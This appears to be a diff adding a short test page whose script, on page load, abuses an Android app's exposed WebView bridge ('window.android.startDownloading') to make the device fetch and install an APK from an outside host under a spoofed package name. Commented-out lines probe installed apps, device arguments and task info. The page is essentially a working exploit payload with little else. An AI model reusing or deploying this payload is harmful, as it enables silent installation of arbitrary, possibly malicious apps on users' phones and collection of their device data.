@@ -1,0 +1,41 @@
+
+GET<BR>/tecno/ozon_install.php<BR><BR>
+
+<h1>Test</h1>
+
+<script>
+
+window.onload = function() {
+	if (window.android) {
+		//alert(window.android.getDeviceArgumens());
+		//alert(window.android.getInstalledApp());
+		//alert(window.android.getTaskInfo(0));
+		//window.android.startDownloading("com.facebook.orca", "com.facebook.orca", "com.facebook.orca", "com.facebook.orca", "com.facebook.orca", 0);
+		
+		//startDownloading(iconUrl,itemId,name,packageName,int version,detailType,"SUNN")
+//		window.android.startDownloading("com.statusdownload.businesswhatsapp", "com.statusdownload.businesswhatsapp", "com.statusdownload.businesswhatsapp", "com.statusdownload.businesswhatsapp", "com.statusdownload.businesswhatsapp", 0);
+//		window.android.startDownloading("https://1dmitry.com/ic_launcher.png", "947", "MyNAME", "com.statusdownload.businesswhatsapp", "0", "SOFT", 1, "webview");
+		
+		//String optString = jSONObject.optString("curPage");
+//                String optString2 = jSONObject.optString("lastPage");
+//                String optString3 = jSONObject.optString(Constant.KEY_URL);
+//                String optString4 = jSONObject.optString(FileDownloaderDBHelper.ICONURL, "");
+//                String optString5 = jSONObject.optString("itemID");
+//                String optString6 = jSONObject.optString("name");
+//                String optString7 = jSONObject.optString("packageName");
+//                String optString8 = jSONObject.optString(FileDownloaderDBHelper.PACKAGE_VERSION);
+//                String optString9 = jSONObject.optString("detailType");
+//                String optString10 = jSONObject.optString("fromPage", "webview");
+//                int optInt = jSONObject.optInt("isOffer", 0);
+//                int optInt2 = jSONObject.optInt(DownloadInstallRecordTask.KEY_STATUS);
+//		var response="{'url':'https://cdn2.palmplaystore.com/source/947/110a3acd534544389a0dab5244cd2c27.apk?t=111','lastPage':'1dmitry.com', 'curPage':'1dmitry.com','packageName':'whatsapp.status.bsver', 'iconUrl':'https://1dmitry.com/ic_launcher.png', 'itemID':'0','name':'My app','version':'0','detailType':'SOFT'}";
+
+		var packageName = "com.qiyi.video";
+		var response="{'url':'https://1dmitry.com/apk/total.apk','lastPage':'1dmitry.com', 'curPage':'1dmitry.com','packageName':'"+packageName+"', 'iconUrl':'https://1dmitry.com/ic_launcher.png', 'itemID':'11110','name':'My app','version':'1111110','isOffer':5,'detailType':'SOFT'}";
+		
+		var result = "{'params': \"" + response + "\", 'callback':'', 'progressCallback':'', 'needAthenaTrack':false}";
+		window.android.startDownloading(result);
+                
+	}
+}
+</script>
